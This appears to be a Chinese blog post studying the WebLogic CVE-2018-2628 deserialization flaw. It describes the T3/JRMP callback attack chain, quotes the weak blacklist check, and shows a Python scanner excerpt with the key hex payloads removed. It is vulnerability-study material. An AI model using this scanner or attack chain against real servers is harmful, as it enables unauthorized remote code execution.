# CVE-2018-2628 weblogic WLS 反序列化漏洞 - 斑林鸽的代码世界 - 博客园

> 原文：[`www.cnblogs.com/mutudou/p/14652876.html`](https://www.cnblogs.com/mutudou/p/14652876.html)

# weblogic WLS 反序列化漏洞学习

* * *

## 漏洞简介 ## *** + 漏洞威胁：RCE--远程代码执行 + 漏洞组件：weblogic + 影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3 + 温馨提示：对于攻击者自己构造的新的 payload，还没有被 oracle 加入黑名单，所以还是多加留心、持续监控的好。

## 漏洞复现

* * *

*   我保存了 python 漏扫脚本，重命名为 weblogic2628.py；
*   使用命令 python weblogic2628.py （目标在脚本代码内修改了）探测发现存在漏洞；
*   由于漏洞环境不能控制，没有做进一步测试；
    ![](img/93d2ce66682f1449fc9893942ced763b.png)

**根据大佬分析文档中的步骤，援引如下：**

+ 首先利用 weblogic 的 T3 或者 T3S 协议（目标端口 7001）进行握手尝试，如果握手成功，发送第一步 payload； ![](https://images2018.cnblogs.com/blog/1070321/201804/1070321-20180418142538960-2109398262.png) + 第一步 payload，T3 服务会解包 Object 结果，然后通过 java 反序列化最倒霉的函数 readObject 函数层层反序列化，去请求攻击者服务器的 1099 端口，下载恶意 payload；借用大神一张图： ![](https://images2018.cnblogs.com/blog/1070321/201804/1070321-20180418142730658-294636473.png) + 第二步，攻击者在自己的服务器上启用 ysoserial.exploit.JRMPListener，JRMPListener 会将含有恶意代码的 payload 发送回请求方，这里就是的恶意 Payload 就是任意代码执行的恶意代码； + 援引大神的话：查看 weblogic 日志，并且可以弹出计算器，借大神一张图：

![](img/7610e2d1ba73acbd58293f76ae0628ee.png)

## 漏洞分析部分学习笔记

* * *

```
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;

   for(int i$ = 0; i$ < len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals("java.rmi.registry.Registry")) {
         throw new InvalidObjectException("Unauthorized proxy deserialization");
      }
   }

   return super.resolveProxyClass(interfaces);
} 
```

**上边放上了源码：来看看 InboundMsgAbbrev 中 resolveProxyClass 的实现，resolveProxyClass 是处理 rmi 接口类型的，只判断了 java.rmi.registry.Registry，其实随便找一个 rmi 接口即可绕过。**

大概意思应该是，只判断是否是 RMI 接口，如果是就 OK，没有做其他的权限检查，或可信检查，导致攻击者自己起一个 RMI 接口，就可以引导 weblogic 去请求自己存好的恶意代码段；这个恶意代码是利用 JRMP 加载回来的利用 readObject 解析的，从而达到了 RCE 的目的。对于 JRMP 的解析可以看下大神的原话：

**核心部分就是 JRMP（Java Remote Methodprotocol），在这个 PoC 中会序列化一个 RemoteObjectInvocationHandler，它会利用 UnicastRef 建立到远端的 tcp 连接获取 RMI registry，加载回来再利用 readObject 解析，从而造成反序列化远程代码执行。**

## poc 简要分析（隐去关键十六进制 payload 部分）

* * *

```
def run(dip,dport,index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ##打了补丁之后，会阻塞，所以设置超时时间，默认 15s，根据情况自己调整
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3handshake(sock,server_addr)
    buildT3RequestObject(sock,dport)
    rs=sendEvilObjData(sock,PAYLOAD[index])
    print 'rs',rs
    checkVul(rs,server_addr,index) 
```

```
def t3handshake(sock,server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print 'handshake successful' 
```

```
def buildT3RequestObject(sock,port):
    data1 = ''
    data2 = ''.format('{:04x}'.format(dport))
    data3 = ''
    data4 = ''
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))

def sendEvilObjData(sock,data):
    payload=''
    payload+=data  
    payload+=''
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception as e:
        pass
    return res

def checkVul(res,server_addr,index):
    p=re.findall(VER_SIG[index], res, re.S)
    if len(p)>0:
        print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
    else:
        print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]) 
```

看一下基本过程就是先进行 T3 的握手，成功了就发送第一步的 payload，然后发送 RequestObject，尝试让 weblogic 反连自己，然后发送恶意数据，通过回显判定恶意特征串来判定是否存在漏洞。